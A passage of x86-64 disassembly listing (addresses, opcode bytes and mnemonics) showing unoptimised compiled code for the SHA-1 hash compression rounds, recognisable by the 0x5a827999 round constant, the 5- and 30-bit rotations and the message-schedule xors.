  4037e2:	89 c0                	mov    %eax,%eax
  4037e4:	48 c1 e8 02          	shr    $0x2,%rax
  4037e8:	48 09 d0             	or     %rdx,%rax
  4037eb:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4037f2:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4037f9:	48 c1 e0 05          	shl    $0x5,%rax
  4037fd:	48 89 c2             	mov    %rax,%rdx
  403800:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403807:	89 c0                	mov    %eax,%eax
  403809:	48 c1 e8 1b          	shr    $0x1b,%rax
  40380d:	48 89 d1             	mov    %rdx,%rcx
  403810:	48 09 c1             	or     %rax,%rcx
  403813:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  40381a:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403821:	48 31 d0             	xor    %rdx,%rax
  403824:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  40382b:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403832:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403836:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  40383a:	48 01 c2             	add    %rax,%rdx
  40383d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403844:	48 01 d0             	add    %rdx,%rax
  403847:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40384d:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403854:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40385b:	48 c1 e0 1e          	shl    $0x1e,%rax
  40385f:	48 89 c2             	mov    %rax,%rdx
  403862:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403869:	89 c0                	mov    %eax,%eax
  40386b:	48 c1 e8 02          	shr    $0x2,%rax
  40386f:	48 09 d0             	or     %rdx,%rax
  403872:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403879:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403880:	48 c1 e0 05          	shl    $0x5,%rax
  403884:	48 89 c2             	mov    %rax,%rdx
  403887:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  40388e:	89 c0                	mov    %eax,%eax
  403890:	48 c1 e8 1b          	shr    $0x1b,%rax
  403894:	48 89 d1             	mov    %rdx,%rcx
  403897:	48 09 c1             	or     %rax,%rcx
  40389a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4038a1:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  4038a8:	48 31 d0             	xor    %rdx,%rax
  4038ab:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  4038b2:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  4038b9:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4038bd:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4038c1:	48 01 c2             	add    %rax,%rdx
  4038c4:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4038cb:	48 01 d0             	add    %rdx,%rax
  4038ce:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4038d4:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4038db:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4038e2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4038e6:	48 89 c2             	mov    %rax,%rdx
  4038e9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4038f0:	89 c0                	mov    %eax,%eax
  4038f2:	48 c1 e8 02          	shr    $0x2,%rax
  4038f6:	48 09 d0             	or     %rdx,%rax
  4038f9:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403900:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403907:	48 c1 e0 05          	shl    $0x5,%rax
  40390b:	48 89 c2             	mov    %rax,%rdx
  40390e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403915:	89 c0                	mov    %eax,%eax
  403917:	48 c1 e8 1b          	shr    $0x1b,%rax
  40391b:	48 89 d1             	mov    %rdx,%rcx
  40391e:	48 09 c1             	or     %rax,%rcx
  403921:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403928:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  40392f:	48 31 d0             	xor    %rdx,%rax
  403932:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403939:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403940:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403944:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  403948:	48 01 c2             	add    %rax,%rdx
  40394b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403952:	48 01 d0             	add    %rdx,%rax
  403955:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  40395b:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403962:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403969:	48 c1 e0 1e          	shl    $0x1e,%rax
  40396d:	48 89 c2             	mov    %rax,%rdx
  403970:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403977:	89 c0                	mov    %eax,%eax
  403979:	48 c1 e8 02          	shr    $0x2,%rax
  40397d:	48 09 d0             	or     %rdx,%rax
  403980:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403987:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40398e:	48 c1 e0 05          	shl    $0x5,%rax
  403992:	48 89 c2             	mov    %rax,%rdx
  403995:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40399c:	89 c0                	mov    %eax,%eax
  40399e:	48 c1 e8 1b          	shr    $0x1b,%rax
  4039a2:	48 89 d1             	mov    %rdx,%rcx
  4039a5:	48 09 c1             	or     %rax,%rcx
  4039a8:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4039af:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  4039b6:	48 31 d0             	xor    %rdx,%rax
  4039b9:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  4039c0:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  4039c7:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  4039cb:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  4039cf:	48 01 c2             	add    %rax,%rdx
  4039d2:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  4039d9:	48 01 d0             	add    %rdx,%rax
  4039dc:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  4039e2:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  4039e9:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4039f0:	48 c1 e0 1e          	shl    $0x1e,%rax
  4039f4:	48 89 c2             	mov    %rax,%rdx
  4039f7:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  4039fe:	89 c0                	mov    %eax,%eax
  403a00:	48 c1 e8 02          	shr    $0x2,%rax
  403a04:	48 09 d0             	or     %rdx,%rax
  403a07:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403a0e:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403a15:	48 c1 e0 05          	shl    $0x5,%rax
  403a19:	48 89 c2             	mov    %rax,%rdx
  403a1c:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403a23:	89 c0                	mov    %eax,%eax
  403a25:	48 c1 e8 1b          	shr    $0x1b,%rax
  403a29:	48 89 d1             	mov    %rdx,%rcx
  403a2c:	48 09 c1             	or     %rax,%rcx
  403a2f:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403a36:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403a3d:	48 31 d0             	xor    %rdx,%rax
  403a40:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403a47:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403a4e:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403a52:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  403a56:	48 01 c2             	add    %rax,%rdx
  403a59:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403a60:	48 01 d0             	add    %rdx,%rax
  403a63:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403a69:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403a70:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403a77:	48 c1 e0 1e          	shl    $0x1e,%rax
  403a7b:	48 89 c2             	mov    %rax,%rdx
  403a7e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403a85:	89 c0                	mov    %eax,%eax
  403a87:	48 c1 e8 02          	shr    $0x2,%rax
  403a8b:	48 09 d0             	or     %rdx,%rax
  403a8e:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403a95:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403a9c:	48 c1 e0 05          	shl    $0x5,%rax
  403aa0:	48 89 c2             	mov    %rax,%rdx
  403aa3:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403aaa:	89 c0                	mov    %eax,%eax
  403aac:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ab0:	48 89 d1             	mov    %rdx,%rcx
  403ab3:	48 09 c1             	or     %rax,%rcx
  403ab6:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403abd:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403ac4:	48 31 d0             	xor    %rdx,%rax
  403ac7:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  403ace:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403ad5:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403ad9:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  403add:	48 01 c2             	add    %rax,%rdx
  403ae0:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403ae7:	48 01 d0             	add    %rdx,%rax
  403aea:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403af0:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403af7:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403afe:	48 c1 e0 1e          	shl    $0x1e,%rax
  403b02:	48 89 c2             	mov    %rax,%rdx
  403b05:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403b0c:	89 c0                	mov    %eax,%eax
  403b0e:	48 c1 e8 02          	shr    $0x2,%rax
  403b12:	48 09 d0             	or     %rdx,%rax
  403b15:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403b1c:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403b23:	48 c1 e0 05          	shl    $0x5,%rax
  403b27:	48 89 c2             	mov    %rax,%rdx
  403b2a:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403b31:	89 c0                	mov    %eax,%eax
  403b33:	48 c1 e8 1b          	shr    $0x1b,%rax
  403b37:	48 89 d1             	mov    %rdx,%rcx
  403b3a:	48 09 c1             	or     %rax,%rcx
  403b3d:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403b44:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  403b4b:	48 31 d0             	xor    %rdx,%rax
  403b4e:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  403b55:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  403b5c:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403b60:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  403b64:	48 01 c2             	add    %rax,%rdx
  403b67:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403b6e:	48 01 d0             	add    %rdx,%rax
  403b71:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403b77:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403b7e:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403b85:	48 c1 e0 1e          	shl    $0x1e,%rax
  403b89:	48 89 c2             	mov    %rax,%rdx
  403b8c:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403b93:	89 c0                	mov    %eax,%eax
  403b95:	48 c1 e8 02          	shr    $0x2,%rax
  403b99:	48 09 d0             	or     %rdx,%rax
  403b9c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403ba3:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403baa:	48 c1 e0 05          	shl    $0x5,%rax
  403bae:	48 89 c2             	mov    %rax,%rdx
  403bb1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403bb8:	89 c0                	mov    %eax,%eax
  403bba:	48 c1 e8 1b          	shr    $0x1b,%rax
  403bbe:	48 89 d1             	mov    %rdx,%rcx
  403bc1:	48 09 c1             	or     %rax,%rcx
  403bc4:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403bcb:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  403bd2:	48 31 d0             	xor    %rdx,%rax
  403bd5:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403bdc:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403be3:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403be7:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  403beb:	48 01 c2             	add    %rax,%rdx
  403bee:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403bf5:	48 01 d0             	add    %rdx,%rax
  403bf8:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403bfe:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403c05:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403c0c:	48 c1 e0 1e          	shl    $0x1e,%rax
  403c10:	48 89 c2             	mov    %rax,%rdx
  403c13:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403c1a:	89 c0                	mov    %eax,%eax
  403c1c:	48 c1 e8 02          	shr    $0x2,%rax
  403c20:	48 09 d0             	or     %rdx,%rax
  403c23:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403c2a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403c31:	48 c1 e0 05          	shl    $0x5,%rax
  403c35:	48 89 c2             	mov    %rax,%rdx
  403c38:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403c3f:	89 c0                	mov    %eax,%eax
  403c41:	48 c1 e8 1b          	shr    $0x1b,%rax
  403c45:	48 89 d1             	mov    %rdx,%rcx
  403c48:	48 09 c1             	or     %rax,%rcx
  403c4b:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403c52:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403c59:	48 31 d0             	xor    %rdx,%rax
  403c5c:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  403c63:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403c6a:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403c6e:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  403c72:	48 01 c2             	add    %rax,%rdx
  403c75:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403c7c:	48 01 d0             	add    %rdx,%rax
  403c7f:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403c85:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403c8c:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403c93:	48 c1 e0 1e          	shl    $0x1e,%rax
  403c97:	48 89 c2             	mov    %rax,%rdx
  403c9a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403ca1:	89 c0                	mov    %eax,%eax
  403ca3:	48 c1 e8 02          	shr    $0x2,%rax
  403ca7:	48 09 d0             	or     %rdx,%rax
  403caa:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403cb1:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403cb8:	48 c1 e0 05          	shl    $0x5,%rax
  403cbc:	48 89 c2             	mov    %rax,%rdx
  403cbf:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403cc6:	89 c0                	mov    %eax,%eax
  403cc8:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ccc:	48 89 d1             	mov    %rdx,%rcx
  403ccf:	48 09 c1             	or     %rax,%rcx
  403cd2:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403cd9:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403ce0:	48 31 d0             	xor    %rdx,%rax
  403ce3:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403cea:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403cf1:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403cf5:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  403cf9:	48 01 c2             	add    %rax,%rdx
  403cfc:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d03:	48 01 d0             	add    %rdx,%rax
  403d06:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403d0c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403d13:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403d1a:	48 c1 e0 1e          	shl    $0x1e,%rax
  403d1e:	48 89 c2             	mov    %rax,%rdx
  403d21:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403d28:	89 c0                	mov    %eax,%eax
  403d2a:	48 c1 e8 02          	shr    $0x2,%rax
  403d2e:	48 09 d0             	or     %rdx,%rax
  403d31:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403d38:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d3f:	48 c1 e0 05          	shl    $0x5,%rax
  403d43:	48 89 c2             	mov    %rax,%rdx
  403d46:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403d4d:	89 c0                	mov    %eax,%eax
  403d4f:	48 c1 e8 1b          	shr    $0x1b,%rax
  403d53:	48 89 d1             	mov    %rdx,%rcx
  403d56:	48 09 c1             	or     %rax,%rcx
  403d59:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403d60:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  403d67:	48 31 d0             	xor    %rdx,%rax
  403d6a:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  403d71:	48 33 85 58 ff ff ff 	xor    -0xa8(%rbp),%rax
  403d78:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403d7c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  403d80:	48 01 c2             	add    %rax,%rdx
  403d83:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403d8a:	48 01 d0             	add    %rdx,%rax
  403d8d:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403d93:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403d9a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403da1:	48 c1 e0 1e          	shl    $0x1e,%rax
  403da5:	48 89 c2             	mov    %rax,%rdx
  403da8:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403daf:	89 c0                	mov    %eax,%eax
  403db1:	48 c1 e8 02          	shr    $0x2,%rax
  403db5:	48 09 d0             	or     %rdx,%rax
  403db8:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403dbf:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403dc6:	48 c1 e0 05          	shl    $0x5,%rax
  403dca:	48 89 c2             	mov    %rax,%rdx
  403dcd:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403dd4:	89 c0                	mov    %eax,%eax
  403dd6:	48 c1 e8 1b          	shr    $0x1b,%rax
  403dda:	48 89 d1             	mov    %rdx,%rcx
  403ddd:	48 09 c1             	or     %rax,%rcx
  403de0:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403de7:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  403dee:	48 31 d0             	xor    %rdx,%rax
  403df1:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  403df8:	48 33 85 50 ff ff ff 	xor    -0xb0(%rbp),%rax
  403dff:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403e03:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  403e07:	48 01 c2             	add    %rax,%rdx
  403e0a:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e11:	48 01 d0             	add    %rdx,%rax
  403e14:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403e1a:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403e21:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403e28:	48 c1 e0 1e          	shl    $0x1e,%rax
  403e2c:	48 89 c2             	mov    %rax,%rdx
  403e2f:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403e36:	89 c0                	mov    %eax,%eax
  403e38:	48 c1 e8 02          	shr    $0x2,%rax
  403e3c:	48 09 d0             	or     %rdx,%rax
  403e3f:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403e46:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e4d:	48 c1 e0 05          	shl    $0x5,%rax
  403e51:	48 89 c2             	mov    %rax,%rdx
  403e54:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403e5b:	89 c0                	mov    %eax,%eax
  403e5d:	48 c1 e8 1b          	shr    $0x1b,%rax
  403e61:	48 89 d1             	mov    %rdx,%rcx
  403e64:	48 09 c1             	or     %rax,%rcx
  403e67:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403e6e:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  403e75:	48 31 d0             	xor    %rdx,%rax
  403e78:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  403e7f:	48 33 85 70 ff ff ff 	xor    -0x90(%rbp),%rax
  403e86:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403e8a:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  403e8e:	48 01 c2             	add    %rax,%rdx
  403e91:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403e98:	48 01 d0             	add    %rdx,%rax
  403e9b:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403ea1:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  403ea8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403eaf:	48 c1 e0 1e          	shl    $0x1e,%rax
  403eb3:	48 89 c2             	mov    %rax,%rdx
  403eb6:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403ebd:	89 c0                	mov    %eax,%eax
  403ebf:	48 c1 e8 02          	shr    $0x2,%rax
  403ec3:	48 09 d0             	or     %rdx,%rax
  403ec6:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  403ecd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ed4:	48 c1 e0 05          	shl    $0x5,%rax
  403ed8:	48 89 c2             	mov    %rax,%rdx
  403edb:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ee2:	89 c0                	mov    %eax,%eax
  403ee4:	48 c1 e8 1b          	shr    $0x1b,%rax
  403ee8:	48 89 d1             	mov    %rdx,%rcx
  403eeb:	48 09 c1             	or     %rax,%rcx
  403eee:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403ef5:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  403efc:	48 31 d0             	xor    %rdx,%rax
  403eff:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  403f06:	48 33 85 68 ff ff ff 	xor    -0x98(%rbp),%rax
  403f0d:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403f11:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  403f15:	48 01 c2             	add    %rax,%rdx
  403f18:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f1f:	48 01 d0             	add    %rdx,%rax
  403f22:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403f28:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  403f2f:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403f36:	48 c1 e0 1e          	shl    $0x1e,%rax
  403f3a:	48 89 c2             	mov    %rax,%rdx
  403f3d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  403f44:	89 c0                	mov    %eax,%eax
  403f46:	48 c1 e8 02          	shr    $0x2,%rax
  403f4a:	48 09 d0             	or     %rdx,%rax
  403f4d:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  403f54:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
  403f58:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  403f5c:	48 31 c2             	xor    %rax,%rdx
  403f5f:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  403f63:	48 31 c2             	xor    %rax,%rdx
  403f66:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  403f6a:	48 31 d0             	xor    %rdx,%rax
  403f6d:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  403f74:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f7b:	48 c1 e0 05          	shl    $0x5,%rax
  403f7f:	48 89 c2             	mov    %rax,%rdx
  403f82:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  403f89:	89 c0                	mov    %eax,%eax
  403f8b:	48 c1 e8 1b          	shr    $0x1b,%rax
  403f8f:	48 89 d1             	mov    %rdx,%rcx
  403f92:	48 09 c1             	or     %rax,%rcx
  403f95:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  403f9c:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  403fa3:	48 31 d0             	xor    %rdx,%rax
  403fa6:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  403fad:	48 33 85 60 ff ff ff 	xor    -0xa0(%rbp),%rax
  403fb4:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  403fb8:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  403fbf:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  403fc3:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  403fca:	89 c0                	mov    %eax,%eax
  403fcc:	48 c1 e8 1f          	shr    $0x1f,%rax
  403fd0:	48 09 c8             	or     %rcx,%rax
  403fd3:	48 89 45 80          	mov    %rax,-0x80(%rbp)
  403fd7:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  403fdb:	48 01 c2             	add    %rax,%rdx
  403fde:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  403fe5:	48 01 d0             	add    %rdx,%rax
  403fe8:	48 05 99 79 82 5a    	add    $0x5a827999,%rax
  403fee:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  403ff5:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  403ffc:	48 c1 e0 1e          	shl    $0x1e,%rax
  404000:	48 89 c2             	mov    %rax,%rdx
  404003:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40400a:	89 c0                	mov    %eax,%eax
  40400c:	48 c1 e8 02          	shr    $0x2,%rax
  404010:	48 09 d0             	or     %rdx,%rax
  404013:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  40401a:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  40401e:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  404022:	48 31 c2             	xor    %rax,%rdx
  404025:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  404029:	48 31 c2             	xor    %rax,%rdx
  40402c:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  404030:	48 31 d0             	xor    %rdx,%rax
  404033:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  40403a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  404041:	48 c1 e0 05          	shl    $0x5,%rax
  404045:	48 89 c2             	mov    %rax,%rdx
  404048:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40404f:	89 c0                	mov    %eax,%eax
  404051:	48 c1 e8 1b          	shr    $0x1b,%rax
